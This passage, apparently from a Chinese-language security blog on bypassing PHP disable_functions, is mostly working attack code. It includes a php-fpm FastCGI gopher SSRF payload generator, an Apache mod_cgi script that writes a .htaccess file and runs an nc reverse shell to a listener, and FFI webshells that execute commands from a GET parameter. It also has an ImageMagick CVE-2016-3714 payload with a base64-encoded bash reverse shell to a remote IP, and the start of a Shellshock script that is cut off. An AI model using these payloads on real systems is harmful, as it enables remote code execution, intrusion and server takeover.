self.__waitForResponse(requestId)</span><br>        <span class="hljs-keyword">return</span> request<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__waitForResponse</span>(<span class="hljs-params">self, requestId</span>):<br>        data = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            buf = self.sock.recv(<span class="hljs-number">512</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">len</span>(buf):<br>                <span class="hljs-keyword">break</span><br>            data += buf<br><br>        data = BytesIO(data)<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            response = self.__decodeFastCGIRecord(data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> response:<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \<br>                    <span class="hljs-keyword">or</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:<br>                <span class="hljs-keyword">if</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:<br>                    self.requests[<span class="hljs-string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_ERROR<br>                <span class="hljs-keyword">if</span> requestId == <span class="hljs-built_in">int</span>(response[<span class="hljs-string">&#x27;requestId&#x27;</span>]):<br>                    self.requests[requestId][<span class="hljs-string">&#x27;response&#x27;</span>] += response[<span class="hljs-string">&#x27;content&#x27;</span>]<br>            <span class="hljs-keyword">if</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.FCGI_STATE_SUCCESS:<br>                self.requests[requestId]<br>        <span class="hljs-keyword">return</span> self.requests[requestId][<span class="hljs-string">&#x27;response&#x27;</span>]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(self.host, self.port)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    parser = argparse.ArgumentParser(description=<span class="hljs-string">&#x27;Php-fpm code execution vulnerability client.&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;host&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;Target host, such as 127.0.0.1&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-c&#x27;</span>, <span class="hljs-string">&#x27;--code&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;What php code your want to execute&#x27;</span>, default=<span class="hljs-string">&#x27;&lt;?php phpinfo(); exit; ?&gt;&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;--port&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;FastCGI port&#x27;</span>, default=<span class="hljs-number">9000</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>)<br><br>    args = parser.parse_args()<br><br>    client = FastCGIClient(args.host, args.port, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>)<br>    params = <span class="hljs-built_in">dict</span>()<br>    documentRoot = <span class="hljs-string">&quot;/&quot;</span><br>    uri = args.file<br>    content = args.code<br>    params = &#123;<br>        <span class="hljs-string">&#x27;GATEWAY_INTERFACE&#x27;</span>: <span class="hljs-string">&#x27;FastCGI/1.0&#x27;</span>,<br>        <span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>        <span class="hljs-string">&#x27;SCRIPT_FILENAME&#x27;</span>: documentRoot + uri.lstrip(<span class="hljs-string">&#x27;/&#x27;</span>),<br>        <span class="hljs-string">&#x27;SCRIPT_NAME&#x27;</span>: uri,<br>        <span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>: uri,<br>        <span class="hljs-string">&#x27;DOCUMENT_ROOT&#x27;</span>: documentRoot,<br>        <span class="hljs-string">&#x27;SERVER_SOFTWARE&#x27;</span>: <span class="hljs-string">&#x27;php/fcgiclient&#x27;</span>,<br>        <span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>: <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>        <span class="hljs-string">&#x27;REMOTE_PORT&#x27;</span>: <span class="hljs-string">&#x27;9985&#x27;</span>,<br>        <span class="hljs-string">&#x27;SERVER_ADDR&#x27;</span>: <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>        <span class="hljs-string">&#x27;SERVER_PORT&#x27;</span>: <span class="hljs-string">&#x27;80&#x27;</span>,<br>        <span class="hljs-string">&#x27;SERVER_NAME&#x27;</span>: <span class="hljs-string">&quot;localhost&quot;</span>,<br>        <span class="hljs-string">&#x27;SERVER_PROTOCOL&#x27;</span>: <span class="hljs-string">&#x27;HTTP/1.1&#x27;</span>,<br>        <span class="hljs-string">&#x27;CONTENT_TYPE&#x27;</span>: <span class="hljs-string">&#x27;application/text&#x27;</span>,<br>        <span class="hljs-string">&#x27;CONTENT_LENGTH&#x27;</span>: <span class="hljs-string">&quot;%d&quot;</span> % <span class="hljs-built_in">len</span>(content),<br>        <span class="hljs-string">&#x27;PHP_VALUE&#x27;</span>: <span class="hljs-string">&#x27;unserialize_callback_func = system\nextension_dir = /tmp\nextension = hack.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = &#x27;</span>,<br>        <span class="hljs-string">&#x27;PHP_ADMIN_VALUE&#x27;</span>: <span class="hljs-string">&#x27;allow_url_include = On&#x27;</span><br>    &#125;<br>    <span class="hljs-comment"># 修改点 4</span><br>    <span class="hljs-comment"># response = client.request(params, content)</span><br>    <span class="hljs-comment"># print(force_text(response))</span><br>    request_ssrf = quote(client.request(params, content))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;gopher://127.0.0.1:&quot;</span> + <span class="hljs-built_in">str</span>(args.port) + <span class="hljs-string">&quot;/_&quot;</span> + request_ssrf)<br><br></code></pre></td></tr></table></figure><p>用法和原来一样</p><p><code>python fpm.py 127.0.0.1 -p 9001 /var/www/html/add_api.php -c &quot;&lt;?php phpinfo(); ?&gt;&quot;</code></p><h1 id="Apache-mod-cgi"><a href="#Apache-mod-cgi" class="headerlink" title="Apache_mod_cgi"></a>Apache_mod_cgi</h1><p><strong>利用条件</strong></p><ul><li>Linux 操作系统</li><li>Apache + PHP (apache 使用 apache_mod_php)</li><li>Apache 开启了 cgi, rewrite</li><li>httpd.conf 中给了Web目录 AllowOverride 权限（允许.htaccess文件）</li><li>当前目录可写</li></ul><p><strong>原理</strong></p><p>Apache 在配置开启 CGI 后可以用 ScriptAlias 指令指定一个目录，指定的目录下面便可以存放可执行的 CGI 程序。若是想临时允许一个目录可以执行 CGI 程序并且使得服务器将自定义的后缀解析为 CGI 程序执行，则可以在目的目录下使用 htaccess 文件进行配置，如下：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">Options +ExecCGI<br><span class="hljs-keyword">AddHandler </span>cgi-<span class="hljs-keyword">script </span>.xxx<br></code></pre></td></tr></table></figure><p>这样便会将当前目录下的所有的 .xxx 文件当做 CGI 程序执行了。由于 CGI 程序可以执行命令，那我们可以利用 CGI 来执行系统命令绕过 disable_functions</p><p><strong>利用</strong></p><p>1：在web目录新建一个 .htaccess 文件</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">Options +ExecCGI<br><span class="hljs-keyword">AddHandler </span>cgi-<span class="hljs-keyword">script </span>.xxx<br></code></pre></td></tr></table></figure><p>2：然后新建一个后缀为 .xxx 的文件，内容是要执行的命令，然后赋予777权限</p><p>注意：linux中cgi比较严格，如果上传后发现状态码500，无法解析文件。可能是因为本地编辑器编写上传时编码不一致导致无法解析</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-built_in">echo</span>&amp;&amp;<span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;/var/www/html&quot;</span>;<span class="hljs-built_in">ls</span> -al<br></code></pre></td></tr></table></figure><p>3：最后网页访问即可</p><p>如果命令执行失败，页面也会报 500 错误(因为访问的是 CGI)</p><p><strong>综合利用脚本</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;nc -c &#x27;/bin/bash&#x27; 172.16.15.1 4444&quot;</span>; <span class="hljs-comment">//command to be executed</span><br><span class="hljs-variable">$shellfile</span> = <span class="hljs-string">&quot;#!/bin/bash\n&quot;</span>; <span class="hljs-comment">//using a shellscript</span><br><span class="hljs-variable">$shellfile</span> .= <span class="hljs-string">&quot;echo -ne \&quot;Content-Type: text/html\\n\\n\&quot;\n&quot;</span>; <span class="hljs-comment">//header is needed, otherwise a 500 error is thrown when there is output</span><br><span class="hljs-variable">$shellfile</span> .= <span class="hljs-string">&quot;<span class="hljs-subst">$cmd</span>&quot;</span>; <span class="hljs-comment">//executing $cmd</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkEnabled</span>(<span class="hljs-params"><span class="hljs-variable">$text</span>, <span class="hljs-variable">$condition</span>, <span class="hljs-variable">$yes</span>, <span class="hljs-variable">$no</span></span>) //<span class="hljs-title">this</span> <span class="hljs-title">surely</span> <span class="hljs-title">can</span> <span class="hljs-title">be</span> <span class="hljs-title">shorter</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$text</span>: &quot;</span> . (<span class="hljs-variable">$condition</span> ? <span class="hljs-variable">$yes</span> : <span class="hljs-variable">$no</span>) . <span class="hljs-string">&quot;&lt;br&gt;\n&quot;</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;checked&#x27;</span>])) &#123;<br>@<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;.htaccess&#x27;</span>, <span class="hljs-string">&quot;\nSetEnv HTACCESS on&quot;</span>, FILE_APPEND); <span class="hljs-comment">//Append it to a .htaccess file to see whether .htaccess is allowed</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: &#x27;</span> . <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>] . <span class="hljs-string">&#x27;?checked=true&#x27;</span>); <span class="hljs-comment">//execute the script again to see if the htaccess test worked</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$modcgi</span> = <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-string">&#x27;mod_cgi&#x27;</span>, <span class="hljs-title function_ invoke__">apache_get_modules</span>()); <span class="hljs-comment">// mod_cgi enabled?</span><br><span class="hljs-variable">$writable</span> = <span class="hljs-title function_ invoke__">is_writable</span>(<span class="hljs-string">&#x27;.&#x27;</span>); <span class="hljs-comment">//current dir writable?</span><br><span class="hljs-variable">$htaccess</span> = !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTACCESS&#x27;</span>]); <span class="hljs-comment">//htaccess enabled?</span><br><span class="hljs-title function_ invoke__">checkEnabled</span>(<span class="hljs-string">&quot;Mod-Cgi enabled&quot;</span>, <span class="hljs-variable">$modcgi</span>, <span class="hljs-string">&quot;Yes&quot;</span>, <span class="hljs-string">&quot;No&quot;</span>);<br><span class="hljs-title function_ invoke__">checkEnabled</span>(<span class="hljs-string">&quot;Is writable&quot;</span>, <span class="hljs-variable">$writable</span>, <span class="hljs-string">&quot;Yes&quot;</span>, <span class="hljs-string">&quot;No&quot;</span>);<br><span class="hljs-title function_ invoke__">checkEnabled</span>(<span class="hljs-string">&quot;htaccess working&quot;</span>, <span class="hljs-variable">$htaccess</span>, <span class="hljs-string">&quot;Yes&quot;</span>, <span class="hljs-string">&quot;No&quot;</span>);<br><span class="hljs-keyword">if</span> (!(<span class="hljs-variable">$modcgi</span> &amp;&amp; <span class="hljs-variable">$writable</span> &amp;&amp; <span class="hljs-variable">$htaccess</span>)) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Error. All of the above must be true for the script to work!&quot;</span>; <span class="hljs-comment">//abort if not</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-title function_ invoke__">checkEnabled</span>(<span class="hljs-string">&quot;Backing up .htaccess&quot;</span>, <span class="hljs-title function_ invoke__">copy</span>(<span class="hljs-string">&quot;.htaccess&quot;</span>, <span class="hljs-string">&quot;.htaccess.bak&quot;</span>), <span class="hljs-string">&quot;Suceeded! Saved in .htaccess.bak&quot;</span>, <span class="hljs-string">&quot;Failed!&quot;</span>); <span class="hljs-comment">//make a backup, cause you never know.</span><br><span class="hljs-title function_ invoke__">checkEnabled</span>(<span class="hljs-string">&quot;Write .htaccess file&quot;</span>, <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;.htaccess&#x27;</span>, <span class="hljs-string">&quot;Options +ExecCGI\nAddHandler cgi-script .dizzle&quot;</span>), <span class="hljs-string">&quot;Succeeded!&quot;</span>, <span class="hljs-string">&quot;Failed!&quot;</span>); <span class="hljs-comment">//.dizzle is a nice extension</span><br><span class="hljs-title function_ invoke__">checkEnabled</span>(<span class="hljs-string">&quot;Write shell file&quot;</span>, <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;shell.dizzle&#x27;</span>, <span class="hljs-variable">$shellfile</span>), <span class="hljs-string">&quot;Succeeded!&quot;</span>, <span class="hljs-string">&quot;Failed!&quot;</span>); <span class="hljs-comment">//write the file</span><br><span class="hljs-title function_ invoke__">checkEnabled</span>(<span class="hljs-string">&quot;Chmod 777&quot;</span>, <span class="hljs-title function_ invoke__">chmod</span>(<span class="hljs-string">&quot;shell.dizzle&quot;</span>, <span class="hljs-number">0777</span>), <span class="hljs-string">&quot;Succeeded!&quot;</span>, <span class="hljs-string">&quot;Failed!&quot;</span>); <span class="hljs-comment">//rwx</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Executing the script now. Check your listener &lt;img src = &#x27;shell.dizzle&#x27; style = &#x27;display:none;&#x27;&gt;&quot;</span>; <span class="hljs-comment">//call the script</span><br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="php74-FFI"><a href="#php74-FFI" class="headerlink" title="php74_FFI"></a>php74_FFI</h1><p><strong>利用条件</strong></p><ul><li>Linux 操作系统</li><li>PHP &gt;&#x3D; 7.4</li><li>开启了 FFI 扩展且 ffi.enable&#x3D;true</li></ul><p><strong>原理</strong></p><p>FFI（Foreign Function Interface），即外部函数接口，允许从用户区调用C代码。简单地说，就是一项让你在PHP里能够调用C代码的技术</p><p>通过c语言的system去执行命令,绕过php的disable_functions</p><p><strong>利用</strong></p><p>C库的system函数执行是没有回显的，所以需要将执行结果写入到tmp等有权限的目录中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-variable">$ffi</span> = FFI::<span class="hljs-title function_ invoke__">cdef</span>(<span class="hljs-string">&quot;int system(const char *command);&quot;</span>);<br><span class="hljs-variable">$ffi</span>-&gt;<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$cmd</span> &gt; /tmp/SD&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/tmp/SD&quot;</span>);<br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;/tmp/SD&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>或者调用popen和fgetc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-variable">$ffi</span> = FFI::<span class="hljs-title function_ invoke__">cdef</span>(<span class="hljs-string">&quot;void *popen(char*,char*);void pclose(void*);int fgetc(void*);&quot;</span>,<span class="hljs-string">&quot;libc.so.6&quot;</span>);<br><span class="hljs-variable">$o</span> = <span class="hljs-variable">$ffi</span>-&gt;<span class="hljs-title function_ invoke__">popen</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$cmd</span>&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<br><span class="hljs-variable">$d</span> = <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-keyword">while</span>((<span class="hljs-variable">$c</span> = <span class="hljs-variable">$ffi</span>-&gt;<span class="hljs-title function_ invoke__">fgetc</span>(<span class="hljs-variable">$o</span>)) != -<span class="hljs-number">1</span>)&#123;<span class="hljs-variable">$d</span> .= <span class="hljs-title function_ invoke__">str_pad</span>(<span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$c</span>)),<span class="hljs-number">2</span>,<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-number">0</span>);&#125;<br><span class="hljs-variable">$ffi</span>-&gt;<span class="hljs-title function_ invoke__">pclose</span>(<span class="hljs-variable">$o</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$d</span>);<br></code></pre></td></tr></table></figure><p>又或者调用PHP源码中的函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-variable">$ffi</span> = FFI::<span class="hljs-title function_ invoke__">cdef</span>(<span class="hljs-string">&quot;int php_exec(int type, char *cmd);&quot;</span>);<br><span class="hljs-variable">$ffi</span>-&gt;<span class="hljs-title function_ invoke__">php_exec</span>(<span class="hljs-number">3</span>,<span class="hljs-string">&quot;<span class="hljs-subst">$cmd</span>&quot;</span>);   <span class="hljs-comment">//3表示passthru()函数，其执行命令可以直接将结果原始输出</span><br></code></pre></td></tr></table></figure><h1 id="ImageMagick-CVE-2016–3714"><a href="#ImageMagick-CVE-2016–3714" class="headerlink" title="ImageMagick(CVE-2016–3714)"></a>ImageMagick(CVE-2016–3714)</h1><p><strong>利用条件</strong></p><ul><li>漏洞影响ImageMagick 6.9.3-9以前的所有版本</li><li>安装了 php-imagick 拓展并在 php.ini 中启用</li><li>编写 php 通过 new Imagick 对象的方式来处理图片等格式文件</li><li>PHP &gt;&#x3D; 5.4</li></ul><p><strong>原理</strong></p><p><a href="https://imagetragick.com/">https://imagetragick.com/</a><br><a href="https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html">https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html</a></p><p>简单来说就是ImageMagick有一个功能叫做delegate（委托），作用是调用外部的lib来处理文件。而调用外部lib的过程是使用系统的system命令来执行的</p><p>同时它内部定义了很多占位符，而在其中command的位置，%i和%l等占位符被拼接在命令行中。这个漏洞也因此而来，被拼接完毕的命令行传入了系统的system函数，而我们只需使用反引号（&#96;）或闭合双引号，来执行任意命令</p><p><strong>利用</strong></p><p>反弹shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Disable Functions: &quot;</span> . <span class="hljs-title function_ invoke__">ini_get</span>(<span class="hljs-string">&#x27;disable_functions&#x27;</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">AAAA</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$exploit</span> = <span class="hljs-string">&lt;&lt;&lt;EOF</span><br><span class="hljs-string">push graphic-context</span><br><span class="hljs-string">viewbox 0 0 640 480</span><br><span class="hljs-string">fill &#x27;url(https://127.0.0.0/oops.jpg?`echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzQ3Ljk5Ljc3LjUyLzg4ODggMD4mMQ== | base64 -d | bash`&quot;||id &quot; )&#x27;</span><br><span class="hljs-string">pop graphic-context</span><br><span class="hljs-string">EOF</span>;<br><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;KKKK.mvg&quot;</span>, <span class="hljs-variable">$exploit</span>);<br><span class="hljs-variable">$thumb</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Imagick</span>();<br><span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">readImage</span>(<span class="hljs-string">&#x27;KKKK.mvg&#x27;</span>);<br><span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">writeImage</span>(<span class="hljs-string">&#x27;KKKK.png&#x27;</span>);<br><span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">clear</span>();<br><span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">destroy</span>();<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;KKKK.mvg&quot;</span>);<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;KKKK.png&quot;</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">AAAA</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>执行命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Disable functions: &quot;</span> . <span class="hljs-title function_ invoke__">ini_get</span>(<span class="hljs-string">&quot;disable_functions&quot;</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$command</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>] : <span class="hljs-string">&#x27;id&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Run command: <span class="hljs-subst">$command</span>\n====================\n&quot;</span>;<br><br><span class="hljs-variable">$data_file</span> = <span class="hljs-title function_ invoke__">tempnam</span>(<span class="hljs-string">&#x27;/tmp&#x27;</span>, <span class="hljs-string">&#x27;img&#x27;</span>);<br><span class="hljs-variable">$imagick_file</span> = <span class="hljs-title function_ invoke__">tempnam</span>(<span class="hljs-string">&#x27;/tmp&#x27;</span>, <span class="hljs-string">&#x27;img&#x27;</span>);<br><br><span class="hljs-variable">$exploit</span> = <span class="hljs-string">&lt;&lt;&lt;EOF</span><br><span class="hljs-string">push graphic-context</span><br><span class="hljs-string">viewbox 0 0 640 480</span><br><span class="hljs-string">fill &#x27;url(https://127.0.0.1/image.jpg&quot;|<span class="hljs-subst">$command</span>&gt;<span class="hljs-subst">$data_file</span>&quot;)&#x27;</span><br><span class="hljs-string">pop graphic-context</span><br><span class="hljs-string">EOF</span>;<br><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$imagick_file</span>&quot;</span>, <span class="hljs-variable">$exploit</span>);<br><span class="hljs-variable">$thumb</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Imagick</span>();<br><span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">readImage</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$imagick_file</span>&quot;</span>);<br><span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">writeImage</span>(<span class="hljs-title function_ invoke__">tempnam</span>(<span class="hljs-string">&#x27;/tmp&#x27;</span>, <span class="hljs-string">&#x27;img&#x27;</span>));<br><span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">clear</span>();<br><span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">destroy</span>();<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$data_file</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="Bash-Shellshock-CVE-2014-6271"><a href="#Bash-Shellshock-CVE-2014-6271" class="headerlink" title="Bash Shellshock(CVE-2014-6271)"></a>Bash Shellshock(CVE-2014-6271)</h1><p><strong>利用条件</strong></p><ul><li>目标环境存在Bash破壳（CVE-2014-6271）漏洞</li><li>putenv()、mail() 或 error_log() 函数可用</li></ul><p><strong>利用</strong></p><p>需要利用 PHP 中可以调用 popen 或其他能够派生 bash 子进程的函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">runcmd</span>(<span class="hljs-params"><span class="hljs-variable">$c</span></span>)</span>&#123;<br>  <span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;SCRIPT_FILENAME&quot;</span>]);<br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$d</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>) == <span class="hljs-string">&quot;/&quot;</span> &amp;&amp; <span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;putenv&#x27;</span>) &amp;&amp; (<span class="hljs-title function_ 